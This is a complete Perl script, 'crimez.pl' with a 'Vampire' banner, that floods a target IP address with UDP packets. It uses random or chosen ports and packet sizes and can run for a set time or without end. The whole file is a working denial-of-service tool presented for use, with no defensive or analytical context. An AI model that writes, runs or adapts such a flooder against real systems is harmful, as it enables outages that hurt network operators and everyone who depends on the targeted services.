#!/usr/bin/perl
 
##############
# Vampire
##############
 
use Socket;
use strict;
 
if ($#ARGV != 3) {
  print "crimez.pl <ip> <port> <size> <time>\n\n";
  print " port=0: use random ports\n";
  print " size=0: use random size between 64 and 1024\n";
  print " time=0: continuous flood\n";
  exit(1);
}
 
my ($ip,$port,$size,$time) = @ARGV;
 
my ($iaddr,$endtime,$psize,$pport);
 
$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
$endtime = time() + ($time ? $time : 1000000);
 
socket(flood, PF_INET, SOCK_DGRAM, 17);
 
print <<EOTEXT;
___________________¶¶¶¶¶¶¶¶ 
_______________¶¶¶¶¶ 
____________¶¶¶¶________¶¶¶¶¶¶¶ 
__________¶¶¶_______¶¶¶¶¶___¶¶¶¶¶¶__¶¶ 
________¶¶¶_______¶¶_________¶¶¶¶¶¶__¶ 
_______¶¶________¶¶____¶¶¶¶¶¶_____________¶¶ 
_____¶¶¶_____¶__¶¶¶¶¶¶¶______________¶¶¶_¶¶¶¶¶ 
____¶¶¶_____¶__¶¶¶___________¶¶¶¶¶__¶¶___¶¶__¶¶ 
___¶¶¶_____¶¶_________¶¶____¶¶______¶¶¶¶_¶¶¶¶¶ 
__¶¶¶____________¶¶__¶¶_¶¶__¶¶_¶¶¶__¶¶___¶¶__¶¶ 
__¶¶_________¶¶__¶¶__¶__¶___¶¶__¶¶__¶¶¶¶_¶ 
_¶¶¶___¶¶¶¶¶_¶¶__¶¶__¶¶¶¶___¶¶¶¶¶¶_________¶¶¶¶¶ 
_¶¶___¶¶__¶¶_¶¶__¶¶__¶__¶¶______________¶¶¶¶¶¶¶¶¶ 
¶¶¶___¶¶¶¶¶__¶¶__¶¶__¶____________¶¶¶__¶¶¶¶ 
¶¶¶___¶¶__¶¶__¶¶¶_________¶¶¶¶____¶¶¶_¶¶¶¶__¶¶¶¶¶ 
¶¶¶___¶¶¶¶¶¶________¶¶¶¶__¶¶¶¶¶¶__¶¶¶_¶¶¶¶__¶¶¶¶¶¶ 
¶¶¶___¶¶¶¶______¶¶¶_¶¶¶¶__¶¶¶¶¶¶¶_¶¶¶_¶¶¶¶____¶¶¶¶ 
¶¶¶________¶__¶¶¶¶__¶¶¶¶__¶¶¶__¶¶¶¶¶¶__¶¶¶¶¶¶¶¶¶¶ 
_¶¶¶_____¶¶¶__¶¶¶¶__¶¶¶¶__¶¶¶___¶¶¶¶¶___¶¶¶¶¶¶¶ 
_¶¶¶_____¶¶¶_¶¶¶____¶¶¶¶__¶¶¶____¶¶¶¶ 
_¶¶¶¶____¶¶¶¶¶¶¶____¶¶¶¶__¶¶¶_______________¶ 
__¶¶¶____¶¶¶_¶¶¶¶¶__¶¶¶¶__¶__________¶¶¶¶__¶___¶¶¶ 
___¶¶¶___¶¶¶__¶¶¶¶__¶¶________¶¶¶¶¶__¶¶¶__¶___¶¶¶¶¶¶ 
___¶¶¶¶__¶¶¶____¶¶_______¶¶¶¶¶¶______¶___¶___¶¶¶¶¶¶¶ 
____¶¶¶__¶¶¶_________¶¶¶¶¶_________¶________¶¶¶¶¶¶ 
______¶¶¶_________¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶______¶¶¶¶¶¶¶ 
_______¶¶¶¶¶___________¶¶¶¶¶¶¶¶_________¶¶¶¶¶¶¶¶ 
________¶¶¶¶¶¶¶_______________________¶¶¶¶¶¶¶¶ 
__________¶¶¶¶¶¶¶¶¶_______________¶¶¶¶¶¶¶¶¶¶ 
_____________¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶ 
________________¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶ 
_____________________¶¶¶¶¶¶¶¶¶¶¶¶¶


EOTEXT
print "UDP Flooding $ip " . ($port ? $port : "random") . " port with " .
  ($size ? "$size-byte" : "random size") . " packets" .
  ($time ? " for $time seconds" : "") . "\n";
print "Break with Ctrl-C\n" unless $time;
 
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;
 
  send(flood, 
pack("a$psize","saf3e368wumu7repa4uxa2rucHaphubeGamu9R3373af8Us3eTHUgepRAfAS2c6CHAyegURepUbre94wRAwruS2uhU8UXasp7spasw7sw8h7wapr5spabekumu8ast8StRadusASacu6a6e5efrAzeWucH5cumuswaraca7hAbrewrecujetrafefadrawruW4ayAjU37sPUseBr4cRuPhacrUtrf0azrrQlLd1xdSjjtdwXfjyXArkExrVxVlulxssmr0u0lRscLAqjkZB43ajPRmAH4JQ6T1SOZPFmndbEi4IUOIuUmPCXI044f73uGIeJHs8lh36KpJausXqykL2idPx1j120Rra2DI1kmGgde5LI4TJMuQvrotBR3Fli0g1uwt74ALKfRzHYZJR0wkqNncUY178LcbTFtx5n7MF4zX3P4Z3mUVkAebkXqDv6EETKTNBes9kW2QBEBLeKcBH4cUAQ8Y30mdGozVRNJq3wtDMmgtzCibqXEEp3cZATTOMqIDxn3t5HYdspEofPneXpPTUE0TBN8oRAp4DjSlhfDAVmfNgbdSbTHWT7Y7gVi6kgrNXKCM64V4kOGvesVr0SZU3k83r6qAr3w4d26kurU9eBRa53cEtRaQaCHEvacu4PETRaf3yepHAk9FAgU2at8GEMEZAwUjaDesTufu2r3DaPhedR7quCru7reketc8atacAStuGeFruNuTHaWuspabr6drARa4r4cApRewuFRaD3qAXAsPeMAChudRUWxuq73R5dra8epre4tasp8craq677wru5asuq3tradede8rethuSwAfespastuduypUt2fudra5utanewrat83rucruyuje6aphuprUWawrawr4tha922HeSpU8acacu5hastuprecevasteberepagas6ejuje2heswugukerebrajeVeswerajAdagecah3phE9EsutaFrU6erathu2u6utraseCrEjehaChuphEchepeswutrezu86pret6afa"), 
0, pack_sockaddr_in($pport, $iaddr));}
